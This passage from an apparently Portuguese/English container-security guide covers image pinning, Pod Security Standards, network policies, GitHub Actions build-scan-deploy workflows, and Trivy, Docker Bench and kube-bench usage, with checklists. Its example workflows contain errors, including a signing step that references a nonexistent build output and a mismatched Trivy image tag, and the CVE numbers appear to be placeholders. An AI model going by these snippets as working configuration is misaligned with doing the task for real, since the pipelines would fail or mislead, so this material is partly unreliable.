  ✗ Image contains malware
  ✗ Do NOT deploy to production
  ✗ Report to security team
```

**Remediation:**

```yaml
# ✅ SECURE: Trusted image with digest
apiVersion: v1
kind: Pod
metadata:
  name: secure-app-pod
spec:
  containers:
    - name: app
      # ✓ Official registry
      # ✓ Digest (immutable)
      image: ghcr.io/company/app@sha256:a3f7c8e9d2b1c4a5b6f8e7d9c1a2b3d4e5f6a7b8

      # Image pull policy
      imagePullPolicy: Always

  # Private registry authentication
  imagePullSecrets:
    - name: regcred
```

---

### Security Best Practices (Kubernetes)

#### Pod Security Standards

```yaml
# Pod Security Standards (PSS) - Kubernetes 1.25+

# Privileged (Unrestricted):
  - No restrictions
  - Use: Trusted system workloads only

# Baseline (Minimally Restrictive):
  - Prevents known privilege escalations
  - Blocks: privileged, hostPath, hostNetwork

# Restricted (Heavily Restrictive):
  - Follows pod hardening best practices
  - Enforces: non-root, no privilege escalation, drop ALL capabilities

# Apply at namespace level:
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

#### Network Policies

```yaml
# Default: Deny All Traffic
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: deny-all
  namespace: production
spec:
  podSelector: {} # Applies to all pods
  policyTypes:
    - Ingress
    - Egress

---
# Allow: Web → API only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-web-to-api
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: api # Applies to API pods

  policyTypes:
    - Ingress

  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: web # Only from web pods
      ports:
        - protocol: TCP
          port: 8080

---
# Allow: API → Database only
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: allow-api-to-db
  namespace: production
spec:
  podSelector:
    matchLabels:
      app: postgres

  policyTypes:
    - Ingress

  ingress:
    - from:
        - podSelector:
            matchLabels:
              app: api
      ports:
        - protocol: TCP
          port: 5432
```

---

## 🚀 CI/CD Integration

### GitHub Actions - Docker Build & Push

```yaml
# .github/workflows/docker-build.yml
name: Docker Build & Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  build-and-scan:
    runs-on: ubuntu-latest

    permissions:
      contents: read
      packages: write
      security-events: write # For SARIF upload

    steps:
      # 1. Checkout code
      - name: Checkout repository
        uses: actions/checkout@v4

      # 2. Set up Docker Buildx
      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v3

      # 3. Log in to Container Registry
      - name: Log in to GHCR
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      # 4. Extract metadata (tags, labels)
      - name: Extract Docker metadata
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=ref,event=branch
            type=ref,event=pr
            type=semver,pattern={{version}}
            type=sha,prefix={{branch}}-

      # 5. Build Docker image
      - name: Build Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: false # Don't push yet (scan first)
          load: true # Load to local Docker
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

      # 6. Scan image with Trivy
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          format: "sarif"
          output: "trivy-results.sarif"
          severity: "CRITICAL,HIGH"
          exit-code: "1" # Fail on vulnerabilities

      # 7. Upload Trivy results to GitHub Security
      - name: Upload Trivy results to GitHub Security
        uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: "trivy-results.sarif"

      # 8. Scan with Snyk (optional)
      - name: Run Snyk container scan
        uses: snyk/actions/docker@master
        continue-on-error: true
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        with:
          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          args: --severity-threshold=high

      # 9. Generate SBOM
      - name: Generate SBOM with Syft
        uses: anchore/sbom-action@v0
        with:
          image: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          format: cyclonedx-json
          output-file: sbom.json

      # 10. Upload SBOM as artifact
      - name: Upload SBOM
        uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.json

      # 11. Push image (only if all scans pass)
      - name: Push Docker image
        if: github.event_name != 'pull_request'
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}

      # 12. Sign image with Cosign (optional)
      - name: Install Cosign
        if: github.event_name != 'pull_request'
        uses: sigstore/cosign-installer@v3

      - name: Sign image
        if: github.event_name != 'pull_request'
        run: |
          echo "${{ secrets.COSIGN_KEY }}" > cosign.key
          cosign sign --key cosign.key \
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}
        env:
          COSIGN_PASSWORD: ${{ secrets.COSIGN_PASSWORD }}
```

---

### GitHub Actions - Kubernetes Deploy

```yaml
# .github/workflows/k8s-deploy.yml
name: Deploy to Kubernetes

on:
  workflow_run:
    workflows: ["Docker Build & Security Scan"]
    types:
      - completed
    branches: [main]

jobs:
  deploy:
    runs-on: ubuntu-latest
    if: ${{ github.event.workflow_run.conclusion == 'success' }}

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      # Set up kubectl
      - name: Set up kubectl
        uses: azure/setup-kubectl@v3
        with:
          version: "v1.28.0"

      # Configure kubeconfig
      - name: Configure kubectl
        run: |
          mkdir -p $HOME/.kube
          echo "${{ secrets.KUBECONFIG }}" | base64 -d > $HOME/.kube/config

      # Update image in Deployment
      - name: Deploy to Kubernetes
        run: |
          kubectl set image deployment/web-app \
            web=ghcr.io/${{ github.repository }}:${{ github.sha }} \
            -n production

          kubectl rollout status deployment/web-app -n production

      # Verify deployment
      - name: Verify deployment
        run: |
          kubectl get pods -n production
          kubectl get deployment web-app -n production

      # Run smoke tests
      - name: Smoke tests
        run: |
          ENDPOINT=$(kubectl get svc web-service -n production -o jsonpath='{.status.loadBalancer.ingress[0].ip}')
          curl -f http://$ENDPOINT/health || exit 1
```

---

## 🔍 Security Scanning & Hardening

### Trivy - Comprehensive Scanner

```bash
# Install Trivy
$ brew install aquasecurity/trivy/trivy

# Scan image
$ trivy image nginx:latest

# Scan with severity filter
$ trivy image --severity HIGH,CRITICAL nginx:latest

# Scan and output JSON
$ trivy image -f json -o results.json nginx:latest

# Scan filesystem
$ trivy fs /path/to/project

# Scan Kubernetes cluster
$ trivy k8s --report summary cluster

# Scan IaC (Terraform, Dockerfile)
$ trivy config ./terraform/
```

**Trivy Output Example:**

```
nginx:latest (debian 12.4)

Total: 234 (UNKNOWN: 0, LOW: 78, MEDIUM: 98, HIGH: 45, CRITICAL: 13)

┌────────────────┬────────────────┬──────────┬───────────────┬───────────────────┐
│ Library        │ Vulnerability  │ Severity │ Installed Ver │ Fixed Version     │
├────────────────┼────────────────┼──────────┼───────────────┼───────────────────┤
│ openssl        │ CVE-2023-12345 │ CRITICAL │ 3.0.2-0       │ 3.0.2-1           │
│ libcurl4       │ CVE-2023-67890 │ HIGH     │ 7.88.1-1      │ 7.88.1-2          │
│ libssl3        │ CVE-2023-11111 │ HIGH     │ 3.0.2-0       │ 3.0.2-1           │
└────────────────┴────────────────┴──────────┴───────────────┴───────────────────┘

Misconfigurations:

Dockerfile (dockerfile)
═══════════════════════════════════════════════════════════════

Tests: 23 (SUCCESSES: 15, FAILURES: 8, EXCEPTIONS: 0)
Failures: 8 (HIGH: 3, MEDIUM: 4, LOW: 1)

HIGH: Specify a tag in the 'FROM' statement for image 'nginx'
════════════════════════════════════════════════════════════════
Instead of using 'latest' tag, use a specific version.

  Dockerfile:1
────────────────────────────────────────────────────────────────
   1 [ FROM nginx:latest  ← ISSUE
────────────────────────────────────────────────────────────────

HIGH: Last USER is root
════════════════════════════════════════════════════════════════
Running containers with 'root' user can lead to container escape.

  Dockerfile:10
────────────────────────────────────────────────────────────────
  10 [ USER root  ← ISSUE
────────────────────────────────────────────────────────────────
```

---

### Docker Bench Security

```bash
# Run Docker Bench (CIS Docker Benchmark)
$ docker run --rm --net host --pid host --userns host --cap-add audit_control \
  -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST \
  -v /etc:/etc:ro \
  -v /usr/bin/containerd:/usr/bin/containerd:ro \
  -v /usr/bin/runc:/usr/bin/runc:ro \
  -v /usr/lib/systemd:/usr/lib/systemd:ro \
  -v /var/lib:/var/lib:ro \
  -v /var/run/docker.sock:/var/run/docker.sock:ro \
  --label docker_bench_security \
  docker/docker-bench-security
```

**Output:**

```
# --------------------------------------------------------------------------------------------
# Docker Bench for Security v1.3.6
# --------------------------------------------------------------------------------------------

Initializing...

[INFO] 1 - Host Configuration
[PASS] 1.1 - Ensure a separate partition for containers has been created
[WARN] 1.2 - Ensure only trusted users are allowed to control Docker daemon
[PASS] 1.3 - Ensure auditing is configured for Docker daemon

[INFO] 2 - Docker daemon configuration
[PASS] 2.1 - Ensure network traffic is restricted between containers
[FAIL] 2.2 - Ensure the logging level is set to 'info'
[PASS] 2.3 - Ensure Docker is allowed to make changes to iptables
[WARN] 2.4 - Ensure insecure registries are not used

[INFO] 3 - Docker daemon configuration files
[PASS] 3.1 - Ensure that docker.service file ownership is set to root:root
[PASS] 3.2 - Ensure that docker.service file permissions are set to 644

[INFO] 4 - Container Images and Build File
[FAIL] 4.1 - Ensure a user for the container has been created
[WARN] 4.2 - Ensure that containers use only trusted base images
[PASS] 4.3 - Ensure that unnecessary packages are not installed

[INFO] 5 - Container Runtime
[FAIL] 5.1 - Ensure that, if applicable, SELinux security options are set
[PASS] 5.2 - Ensure that containers run as non-root user
[FAIL] 5.3 - Ensure that privileged containers are not used

[INFO] 6 - Docker Security Operations
[PASS] 6.1 - Ensure that image sprawl is avoided
[WARN] 6.2 - Ensure that container sprawl is avoided

# --------------------------------------------------------------------------------------------
# Summary
# --------------------------------------------------------------------------------------------
[INFO] Checks: 100
[PASS] 73
[WARN] 15
[FAIL] 12
```

---

### kube-bench (Kubernetes CIS Benchmark)

```bash
# Run kube-bench
$ kubectl apply -f https://raw.githubusercontent.com/aquasecurity/kube-bench/main/job.yaml

# View results
$ kubectl logs -f job/kube-bench

# Or run as pod
$ kubectl run kube-bench \
  --image=aquasec/kube-bench:latest \
  --restart=Never \
  -- run --targets=node
```

**Output:**

```
[INFO] 1 Control Plane Security Configuration
[PASS] 1.1.1 Ensure that the API server pod specification file permissions are set to 644
[PASS] 1.1.2 Ensure that the API server pod specification file ownership is set to root:root
[FAIL] 1.1.3 Ensure that the controller manager pod specification file permissions are set to 644
[WARN] 1.1.4 Ensure that the controller manager pod specification file ownership is set to root:root

[INFO] 2 Etcd Node Configuration
[PASS] 2.1 Ensure that the --cert-file and --key-file arguments are set as appropriate
[FAIL] 2.2 Ensure that the --client-cert-auth argument is set to true
[PASS] 2.3 Ensure that the --auto-tls argument is not set to true

[INFO] 3 Control Plane Configuration
[PASS] 3.1.1 Client certificate authentication should not be used for users
[WARN] 3.2.1 Ensure that a minimal audit policy is created
[FAIL] 3.2.2 Ensure that the audit policy covers key security concerns

[INFO] 4 Worker Node Security Configuration
[PASS] 4.1.1 Ensure that the kubelet service file permissions are set to 644
[PASS] 4.1.2 Ensure that the kubelet service file ownership is set to root:root
[FAIL] 4.2.1 Ensure that the --anonymous-auth argument is set to false
[PASS] 4.2.2 Ensure that the --authorization-mode argument is not set to AlwaysAllow

== Remediations node ==
4.2.1 Edit the kubelet config file and set authentication.anonymous.enabled to false.
```

---

## 📊 Melhores Práticas

### Docker Security Checklist

```yaml
Image Security: ✓ Use official base images
  ✓ Pin to specific version (digest, not "latest")
  ✓ Scan images (Trivy, Snyk, Clair)
  ✓ Multi-stage builds (minimize size)
  ✓ Distroless images (when possible)
  ✓ Sign images (Cosign, Notary)
  ✓ Generate SBOM (Syft, CycloneDX)

Dockerfile: ✓ Use non-root USER
  ✓ Drop ALL capabilities
  ✓ Read-only root filesystem
  ✓ No secrets in layers
  ✓ Minimize layers (combine RUN)
  ✓ Use .dockerignore
  ✓ HEALTHCHECK defined

Runtime: ✓ Resource limits (--memory, --cpus)
  ✓ Read-only volumes (--read-only)
  ✓ No privileged mode
  ✓ Drop capabilities (--cap-drop)
  ✓ Seccomp profile (default or custom)
  ✓ AppArmor/SELinux profiles

Network: ✓ Isolated networks (custom bridge)
  ✓ Least privilege (no --net=host)
  ✓ TLS for registry communication
  ✓ Network policies (K8s)

Secrets: ✓ Never in ENV variables
  ✓ Use Docker secrets / K8s secrets
  ✓ Mount as files (read-only)
  ✓ Rotate regularly
  ✓ External secret managers (Vault, AWS Secrets Manager)
```

---

### Kubernetes Security Checklist

```yaml
Cluster Hardening:
  ✓ RBAC enabled
  ✓ Network policies enforced
  ✓ Pod Security Standards (restricted)
  ✓ Admission controllers (OPA, Kyverno)
  ✓ Audit logging enabled
  ✓ etcd encrypted at rest
  ✓ API server TLS
  ✓ Rotate certificates

Workload Security:
  ✓ Non-root containers
  ✓ No privileged pods
  ✓ Read-only root filesystem
  ✓ Drop ALL capabilities
  ✓ Resource limits defined
  ✓ Health checks configured
  ✓ Image pull policy: Always
  ✓ Scan images before deploy

Secrets Management:
  ✓ Secrets encrypted at rest
  ✓ RBAC for secret access
  ✓ External secret operators (ESO)
  ✓ Never in ConfigMaps
  ✓ Mount as volumes (not ENV)

Monitoring & Compliance:
  ✓ Runtime security (Falco)
  ✓ Image scanning (Trivy, Aqua)
  ✓ SBOM generation
  ✓ CIS benchmarks (kube-bench)
  ✓ Policy enforcement (OPA)
  ✓ Audit logs centralized (SIEM)
```

---

### Comparison Table

| Aspecto                  | Docker Compose        | Kubernetes                    |
| ------------------------ | --------------------- | ----------------------------- |
| **Uso**                  | Desenvolvimento local | Produção (orquestração)       |
| **Escala**               | 1 host                | Multi-node cluster            |
| **Alta Disponibilidade** | ❌ Não                | ✅ Sim (replicas)             |
| **Load Balancing**       | ❌ Manual             | ✅ Automático                 |
| **Auto-scaling**         | ❌ Não                | ✅ HPA, VPA                   |
| **Self-healing**         | ❌ Não                | ✅ Sim (restarts automáticos) |
| **Service Discovery**    | ⚠️ DNS básico         | ✅ DNS + Endpoints            |
| **Rolling Updates**      | ❌ Manual             | ✅ Automático                 |
| **Secrets Management**   | ⚠️ Básico             | ✅ Nativo (encrypted)         |
| **Networking**           | Bridge/Host           | CNI (Calico, Cilium)          |
| **Storage**              | Volumes locais        | PV/PVC (cloud disks)          |
| **Complexity**           | 🟢 Baixa              | 🔴 Alta                       |
| **Learning Curve**       | 🟢 Fácil              | 🔴 Difícil                    |

---

## 🔗 Links e Referências

**Docker:**

- Docker Docs: https://docs.docker.com
- Dockerfile Best Practices: https://docs.docker.com/develop/dev-best-practices/
- Docker Bench: https://github.com/docker/docker-bench-security

**Kubernetes:**

- Kubernetes Docs: https://kubernetes.io/docs/
- CIS Benchmarks: https://www.cisecurity.org/benchmark/kubernetes
- CNCF Security: https://www.cncf.io/projects/

**Security Tools:**

- Trivy: https://aquasecurity.github.io/trivy/
- Falco: https://falco.org
- OPA: https://www.openpolicyagent.org

---

## 📝 Changelog

| Data       | Versão | Alteração                |
| ---------- | ------ | ------------------------ |
| 2024-02-10 | 1.0    | Documento inicial criado |

---

> **💡 Dica final:** Segurança de containers é **defesa em profundidade**. Combine: imagens seguras (build time) + runtime protection (Falco) + network policies (isolation) + RBAC (access control). Um não substitui o outro!

**Pirâmide de Segurança:**

```
                    ┌──────────────────┐
                    │  Compliance      │  ← Audits, CIS benchmarks
                    │  (kube-bench)    │
                    ├──────────────────┤
                    │  Monitoring      │  ← Runtime detection
                    │  (Falco, SIEM)   │  (Falco, Sysdig)
                    ├──────────────────┤
                    │  Network         │  ← Segmentation
                    │  (Policies)      │  (Zero trust)
                    ├──────────────────┤
                    │  Access Control  │  ← RBAC, least privilege
                    │  (RBAC)          │
                    ├──────────────────┤
                    │  Workload        │  ← Pod hardening
                    │  (Security Ctx)  │  (non-root, RO FS)
                    ├──────────────────┤
                    │  Image           │  ← Vulnerability scanning
                    │  (Scanning)      │  (Trivy, Snyk)
                    └──────────────────┘
```
